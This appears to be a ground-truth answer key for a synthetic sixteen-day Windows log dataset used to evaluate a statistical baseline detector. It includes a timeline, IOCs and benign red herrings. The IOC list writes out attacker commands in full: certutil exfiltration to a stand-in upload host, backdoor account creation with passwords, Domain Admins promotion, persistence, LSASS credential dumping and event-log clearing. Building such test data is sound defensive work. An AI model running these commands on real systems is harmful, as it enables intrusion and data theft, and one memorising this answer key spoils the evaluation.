# Ground Truth: stats-baseline-detection

**Scenario:** Sixteen-day Windows-only dataset built to exercise a per-user statistical
baseline detector.

Layout (scenario timezone Asia/Kolkata; start = 2026-07-29 00:00 IST, a Wednesday):

  Jul 29 - Aug 4   7 days   BASELINE FIT window (includes Sat 01 / Sun 02)
  Aug 5 - Aug 13   9 days   scored attack campaign and post-compromise activity

Only windows_event_security and windows_event_sysmon are generated. No Zeek,
Snort, Cisco ASA, eCAR, syslog, web or proxy evidence exists in this dataset,
because the detector under test consumes Windows Security and Sysmon only.

Split the generated output by local date to reproduce the experiment: fit the
per-user baselines on Jul 29 - Aug 4, then score Aug 5 - Aug 13. Every storyline
step in includes/storyline.yaml carries a `# DETECTS:` comment naming the
baseline feature it moves and which scoring approach can see it.

See docs/detection/README.md for the attack-to-approach coverage matrix.


**Generated:** 2026-07-28 18:30:00 UTC


## Attack Summary

This scenario simulates the following attack sequence:

1. **arjun.iyer** on **PC-003**: Off-hours remote interactive logon from an external address using stolen credentials
2. **arjun.iyer** on **PC-003**: Host and domain discovery from the compromised workstation
3. **SYSTEM** on **DC-01**: Password spray against domain accounts from the attacker's infrastructure
4. **rahul.verma** on **FILE-01**: Network logon to the file server from a workstation the help-desk account never uses
5. **arjun.iyer** on **PC-003**: Credential dumping - injected thread reads LSASS memory
6. **arjun.iyer** on **PC-003**: Harvested administrator credential used explicitly against the file server
7. **priya.menon** on **DC-01**: Backdoor domain account created with the stolen administrator credential
8. **priya.menon** on **DC-01**: Sprayed sales account promoted into Domain Admins
9. **rohan.mehta** on **DC-01**: Newly privileged sales account signs in to the domain controller
10. **priya.menon** on **FILE-01**: Malicious service installed on the file server for persistence
11. **arjun.iyer** on **PC-003**: Scheduled task registered on the beachhead workstation for persistence
12. **arjun.iyer** on **PC-003**: Internal service sweep across the server VLAN
13. **arjun.iyer** on **FILE-01**: Claims data enumerated and staged into a single archive
14. **arjun.iyer** on **PC-003**: Regular HTTPS command-and-control beaconing
15. **kavya.reddy** on **PC-004**: Second implant beacons slowly to a different operator endpoint
16. **arjun.iyer** on **PC-003**: Domain infrastructure reconnaissance over DNS
17. **arjun.iyer** on **FILE-01**: Weekend collection run against the claims share
18. **arjun.iyer** on **PC-003**: Staged archive exfiltrated over HTTPS in a single large transfer
19. **priya.menon** on **FILE-01**: Security event log cleared to remove traces of the service install
20. **vikram.nair** on **PC-006**: Executive workstation signed into, locked, then unlocked late on a Saturday night
21. **arjun.iyer** on **PC-003**: Compromised analyst account attempts remote service execution on the SQL server
22. **rohan.mehta** on **DC-01**: Newly privileged sales account uses explicit credentials to access a second server
23. **priya.menon** on **DC-01**: Attacker creates a second domain account to preserve access after the first account is noticed
24. **arjun.iyer** on **FILE-01**: Second collection pass targets a different business share after the claims archive
25. **rohan.mehta** on **PC-002**: Privileged account performs an unusual pre-dawn interactive sign-in and launches remote administration tooling
26. **priya.menon** on **FILE-01**: Operator removes the temporary staged archive and disables the persistence service


## Timeline

| Timestamp | Actor | System | Event Type | Details |
|-----------|-------|--------|------------|---------|
| 2026-08-04 21:39:42 UTC | arjun.iyer | PC-003 | Logon | Network logon from 203.0.113.47 (LogonID: 0xfff4344) |
| 2026-08-04 21:55:18 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\whoami.exe (PID: 25004) - `whoami /all` |
| 2026-08-04 21:55:55 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\systeminfo.exe (PID: 25028) - `systeminfo` |
| 2026-08-04 21:55:59 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\net.exe (PID: 25032) - `net group "Domain Admins" /domain` |
| 2026-08-04 21:56:38 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\nltest.exe (PID: 25036) - `nltest /dclist:corp.local` |
| 2026-08-04 21:57:07 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\wbem\WMIC.exe (PID: 25052) - `wmic /node:FILE-01 process list brief` |
| 2026-08-04 22:34:56 UTC | SYSTEM | DC-01 | Credential_Spray | Credential spray: 10 attempts against 6 accounts (success: rohan.mehta at attempt 10) |
| 2026-08-04 23:09:35 UTC | rahul.verma | FILE-01 | Logon | Network logon from 10.10.10.23 (LogonID: 0xc397218) |
| 2026-08-04 23:30:06 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\Temp\svc-host-helper.exe (PID: 25064) - `svc-host-helper.exe --dump-auth` |
| 2026-08-04 23:30:07 UTC | arjun.iyer | PC-003 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2026-08-06 04:50:13 UTC | arjun.iyer | PC-003 | Explicit_Credentials | Explicit credentials: RunAs priya.menon on FILE-01 |
| 2026-08-06 05:04:58 UTC | priya.menon | DC-01 | Rdp_Session | RDP session to 10.10.20.10:3389 (UID: (filtered by sensor placement)) |
| 2026-08-06 05:05:00 UTC | priya.menon | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 23324) - `net user svc-audit-sync Wint3r!Sync2026 /add /d...` |
| 2026-08-06 05:05:03 UTC | priya.menon | DC-01 | Account_Created | Account created: svc-audit-sync |
| 2026-08-06 05:20:04 UTC | priya.menon | DC-01 | Group_Member_Added | Added rohan.mehta to group Domain Admins |
| 2026-08-06 05:20:04 UTC | priya.menon | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 23340) - `net group "Domain Admins" rohan.mehta /add /domain` |
| 2026-08-06 05:45:02 UTC | rohan.mehta | DC-01 | Rdp_Session | RDP session to 10.10.20.10:3389 (UID: (filtered by sensor placement)) |
| 2026-08-06 06:10:27 UTC | priya.menon | FILE-01 | Rdp_Session | RDP session to 10.10.20.20:3389 (UID: (filtered by sensor placement)) |
| 2026-08-06 06:10:29 UTC | priya.menon | FILE-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 46880) - `sc create AuditSyncSvc binPath= C:\Windows\Temp...` |
| 2026-08-06 06:10:31 UTC | priya.menon | FILE-01 | Service_Installed | Service installed: AuditSyncSvc (C:\Windows\Temp\auditsync.exe) |
| 2026-08-06 06:30:06 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 25168) - `schtasks /Create /TN "OneDriveSyncCheck" /TR "C...` |
| 2026-08-06 06:30:09 UTC | arjun.iyer | PC-003 | Scheduled_Task_Created | Scheduled task created: \OneDriveSyncCheck |
| 2026-08-07 04:00:00 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 25196) - `powershell.exe -NoProfile -Command 445,1433,598...` |
| 2026-08-07 04:00:15 UTC | arjun.iyer | PC-003 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-07 04:00:26 UTC | arjun.iyer | PC-003 | Connection | Connection to 10.10.20.30:1433 (UID: (filtered by sensor placement)) |
| 2026-08-07 04:00:58 UTC | arjun.iyer | PC-003 | Connection | Connection to 10.10.20.40:5985 (UID: (filtered by sensor placement)) |
| 2026-08-07 04:01:15 UTC | arjun.iyer | PC-003 | Connection | Connection to 10.10.20.10:3389 (UID: (filtered by sensor placement)) |
| 2026-08-07 04:35:26 UTC | arjun.iyer | FILE-01 | Logon | Network logon from 10.10.10.23 (LogonID: 0xdca331f) |
| 2026-08-07 04:35:27 UTC | arjun.iyer | FILE-01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 46892) - `cmd.exe /c dir \\FILE-01\Claims /s /b` |
| 2026-08-07 04:35:28 UTC | arjun.iyer | FILE-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 46904) - `powershell.exe -NoProfile -EncodedCommand QwBvA...` |
| 2026-08-07 05:10:03 UTC | arjun.iyer | PC-003 | Beacon | Beacon to 198.51.100.83:443 (49 attempts, 4h) |
| 2026-08-07 05:10:03 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\rundll32.exe (PID: 25220) - `rundll32.exe C:\Users\arjun.iyer\AppData\Roamin...` |
| 2026-08-07 09:39:44 UTC | kavya.reddy | PC-004 | Process | Process: C:\Windows\System32\rundll32.exe (PID: 47896) - `rundll32.exe C:\Users\kavya.reddy\AppData\Local...` |
| 2026-08-07 09:39:45 UTC | kavya.reddy | PC-004 | Beacon | Beacon to 198.51.100.164:443 (29 attempts, 21h) |
| 2026-08-07 10:50:16 UTC | arjun.iyer | PC-003 | Dns_Query | DNS query: _ldap._tcp.dc._msdcs.corp.local (SRV, NOERROR) |
| 2026-08-07 10:50:17 UTC | arjun.iyer | PC-003 | Dns_Query | DNS query: cdn-metrics-edge.net (A, NOERROR) |
| 2026-08-08 07:00:04 UTC | arjun.iyer | FILE-01 | Logon | Network logon from 10.10.10.23 (LogonID: 0xe904a43) |
| 2026-08-08 07:10:40 UTC | arjun.iyer | FILE-01 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 46920) - `robocopy \\FILE-01\Claims C:\Windows\Temp\stage...` |
| 2026-08-08 07:18:13 UTC | arjun.iyer | FILE-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 46940) - `powershell.exe -NoProfile -Command Compress-Arc...` |
| 2026-08-08 07:28:03 UTC | arjun.iyer | FILE-01 | Process | Process: C:\Windows\System32\certutil.exe (PID: 47000) - `certutil -encode C:\Windows\Temp\q3-claims.zip ...` |
| 2026-08-08 08:10:29 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\certutil.exe (PID: 25228) - `certutil -urlcache -split -f -post C:\Windows\T...` |
| 2026-08-08 08:10:30 UTC | arjun.iyer | PC-003 | Connection | Connection to 198.51.100.83:443 (UID: (filtered by sensor placement)) |
| 2026-08-08 08:44:40 UTC | priya.menon | FILE-01 | Rdp_Session | RDP session to 10.10.20.20:3389 (UID: (filtered by sensor placement)) |
| 2026-08-08 08:44:43 UTC | priya.menon | FILE-01 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 47080) - `wevtutil cl Security` |
| 2026-08-08 08:44:44 UTC | priya.menon | FILE-01 | Log_Cleared | Security event log cleared to remove traces of the service install |
| 2026-08-08 16:19:39 UTC | vikram.nair | PC-006 | Logon | Network logon from 185.220.101.34 (LogonID: 0x187c7296) |
| 2026-08-08 16:25:54 UTC | vikram.nair | PC-006 | Workstation_Lock | Skipped (no eligible interactive session); no evidence emitted |
| 2026-08-08 16:30:15 UTC | vikram.nair | PC-006 | Workstation_Unlock | Workstation Unlocked |
| 2026-08-09 03:44:51 UTC | arjun.iyer | PC-003 | Logon | Network logon from 10.10.10.23 (LogonID: 0x12fcec2b) |
| 2026-08-09 03:44:52 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 25320) - `powershell.exe -NoProfile -Command Get-CimInsta...` |
| 2026-08-09 03:44:53 UTC | arjun.iyer | PC-003 | Connection | Connection to 10.10.20.30:135 (UID: (filtered by sensor placement)) |
| 2026-08-09 04:35:08 UTC | rohan.mehta | DC-01 | Explicit_Credentials | Explicit credentials: RunAs rohan.mehta on SQL-01 |
| 2026-08-10 07:49:36 UTC | priya.menon | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 23480) - `net user svc-report-cache TempReport2026! /add ...` |
| 2026-08-10 07:49:38 UTC | priya.menon | DC-01 | Account_Created | Account created: svc-report-cache |
| 2026-08-11 05:59:51 UTC | arjun.iyer | FILE-01 | Logon | Network logon from 10.10.10.23 (LogonID: 0x10a4bd9b) |
| 2026-08-11 06:05:46 UTC | arjun.iyer | FILE-01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 47092) - `cmd.exe /c dir \\FILE-01\Finance /s /b` |
| 2026-08-11 06:15:24 UTC | arjun.iyer | FILE-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 47100) - `powershell.exe -NoProfile -Command Compress-Arc...` |
| 2026-08-11 20:39:46 UTC | rohan.mehta | PC-002 | Logon | Network logon from 10.10.10.23 (LogonID: 0x15693a7c) |
| 2026-08-11 20:39:47 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\System32\mstsc.exe (PID: 65492) - `mstsc.exe /v:DC-01` |
| 2026-08-13 05:15:23 UTC | priya.menon | FILE-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 47112) - `sc stop AuditSyncSvc` |
| 2026-08-13 05:15:25 UTC | priya.menon | FILE-01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 47116) - `cmd.exe /c del /f C:\Windows\Temp\auditsync.exe` |


## Indicators of Compromise (IOCs)

### Network IOCs

- 10.10.10.23 (Attacker IP)
- 10.10.20.10:3389 (Internal Server)
- 10.10.20.10:3389 (Lateral Movement)
- 10.10.20.20:3389 (Lateral Movement)
- 10.10.20.20:445 (Internal Server)
- 10.10.20.30:135 (Internal Server)
- 10.10.20.30:1433 (Internal Server)
- 10.10.20.40:5985 (Internal Server)
- 185.220.101.34 (Attacker IP)
- 198.51.100.164:443 (Beacon Target)
- 198.51.100.83:443 (Beacon Target)
- 198.51.100.83:443 (Internal Server)
- 203.0.113.47 (Attacker IP)
- _ldap._tcp.dc._msdcs.corp.local (Malicious DNS Query)
- cdn-metrics-edge.net (Malicious DNS Query)

### Process IOCs

- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- C:\Windows\System32\certutil.exe
- C:\Windows\System32\cmd.exe
- C:\Windows\System32\mstsc.exe
- C:\Windows\System32\net.exe
- C:\Windows\System32\nltest.exe
- C:\Windows\System32\robocopy.exe
- C:\Windows\System32\rundll32.exe
- C:\Windows\System32\sc.exe
- C:\Windows\System32\schtasks.exe
- C:\Windows\System32\systeminfo.exe
- C:\Windows\System32\wbem\WMIC.exe
- C:\Windows\System32\wevtutil.exe
- C:\Windows\System32\whoami.exe
- C:\Windows\Temp\svc-host-helper.exe
- Injection Target: C:\Windows\System32\lsass.exe
- Scheduled Task: \OneDriveSyncCheck
- Service: AuditSyncSvc
- `certutil -encode C:\Windows\Temp\q3-claims.zip C:\Windows\Temp\q3-claims.b64`
- `certutil -urlcache -split -f -post C:\Windows\Temp\q3-claims.b64 https://cdn-metrics-edge.net/upload`
- `cmd.exe /c del /f C:\Windows\Temp\auditsync.exe`
- `cmd.exe /c dir \\FILE-01\Claims /s /b`
- `cmd.exe /c dir \\FILE-01\Finance /s /b`
- `mstsc.exe /v:DC-01`
- `net group "Domain Admins" /domain`
- `net group "Domain Admins" rohan.mehta /add /domain`
- `net user svc-audit-sync Wint3r!Sync2026 /add /domain`
- `net user svc-report-cache TempReport2026! /add /domain`
- `nltest /dclist:corp.local`
- `powershell.exe -NoProfile -Command 445,1433,5985,3389 | ForEach-Object { Test-NetConnection 10.10.20.$_ -Port $_ }`
- `powershell.exe -NoProfile -Command Compress-Archive -Path C:\Windows\Temp\stage -DestinationPath C:\Windows\Temp\q3-claims.zip -Force`
- `powershell.exe -NoProfile -Command Compress-Archive -Path \\FILE-01\Finance -DestinationPath C:\Windows\Temp\finance-review.zip -Force`
- `powershell.exe -NoProfile -Command Get-CimInstance Win32_Service -ComputerName SQL-01`
- `powershell.exe -NoProfile -EncodedCommand QwBvAG0AcAByAGUAcwBzAC0AQQByAGMAaABpAHYAZQA=`
- `robocopy \\FILE-01\Claims C:\Windows\Temp\stage /E /R:1 /W:1`
- `rundll32.exe C:\Users\arjun.iyer\AppData\Roaming\edgesync.dll,ServiceMain`
- `rundll32.exe C:\Users\kavya.reddy\AppData\Local\Temp\telemsync.dll,Init`
- `sc create AuditSyncSvc binPath= C:\Windows\Temp\auditsync.exe start= auto`
- `sc stop AuditSyncSvc`
- `schtasks /Create /TN "OneDriveSyncCheck" /TR "C:\Users\arjun.iyer\AppData\Roaming\sync.exe" /SC HOURLY /RU SYSTEM`
- `svc-host-helper.exe --dump-auth`
- `systeminfo`
- `wevtutil cl Security`
- `whoami /all`
- `wmic /node:FILE-01 process list brief`

### User IOCs

- Group: Domain Admins (compromised account)
- SYSTEM (compromised account)
- ananya.sharma (Spray Target) (compromised account)
- arjun.iyer (compromised account)
- kavya.reddy (compromised account)
- kavya.reddy (Spray Target) (compromised account)
- priya.menon (compromised account)
- priya.menon (Explicit Credential Target) (compromised account)
- rahul.verma (compromised account)
- rahul.verma (Spray Target) (compromised account)
- rohan.mehta (compromised account)
- rohan.mehta (Explicit Credential Target) (compromised account)
- rohan.mehta (Spray Target) (compromised account)
- sneha.patel (Spray Target) (compromised account)
- svc-audit-sync (compromised account)
- svc-report-cache (compromised account)
- vikram.nair (compromised account)
- vikram.nair (Spray Target) (compromised account)

### File IOCs

- C:\Windows\System32\cmd.exe
- C:\Windows\Temp\auditsync.exe


## Red Herrings

The following events appear suspicious but are benign. They are included to make the dataset more realistic.

| Timestamp | Actor | System | Activity | Why It's Benign |
|-----------|-------|--------|----------|-----------------|
| 2026-08-05 04:35:22 UTC | sneha.patel | PC-008 | Security analyst runs domain enumeration tooling during a scheduled internal audit | Authorised quarterly access review. The commands overlap heavily with the attacker's discovery step on the same day, but the actor, host and hour are all consistent with her role.
 |
| 2026-08-05 04:35:24 UTC | sneha.patel | PC-008 | Security analyst runs domain enumeration tooling during a scheduled internal audit | Authorised quarterly access review. The commands overlap heavily with the attacker's discovery step on the same day, but the actor, host and hour are all consistent with her role.
 |
| 2026-08-06 09:34:34 UTC | rahul.verma | PC-001 | Help desk remote session to troubleshoot a finance workstation | Normal ticket work; the help-desk account legitimately touches many workstations. |
| 2026-08-06 09:54:31 UTC | rahul.verma | PC-004 | Help desk remote session to troubleshoot a developer workstation | Same ticket queue as rh-02a. |
| 2026-08-06 10:19:50 UTC | rahul.verma | PC-006 | Help desk remote session to troubleshoot the executive workstation | Same ticket queue as rh-02a. |
| 2026-08-07 00:09:47 UTC | vikram.nair | PC-006 | Executive signs in before dawn to clear mail ahead of a flight | Benign early start. Deliberately placed in the same unoccupied hour band as the attacker's off-hours logon so that hour novelty alone cannot separate malicious from benign.
 |
| 2026-08-09 05:29:47 UTC | priya.menon | FILE-01 | Sunday maintenance window - administrator patches the file server | Approved change-window activity. This is the false positive that a weekday-aware daily baseline is most likely to raise, since weekend administrative work is rare but legitimate.
 |
| 2026-08-09 05:29:50 UTC | priya.menon | FILE-01 | Sunday maintenance window - administrator patches the file server | Approved change-window activity. This is the false positive that a weekday-aware daily baseline is most likely to raise, since weekend administrative work is rare but legitimate.
 |
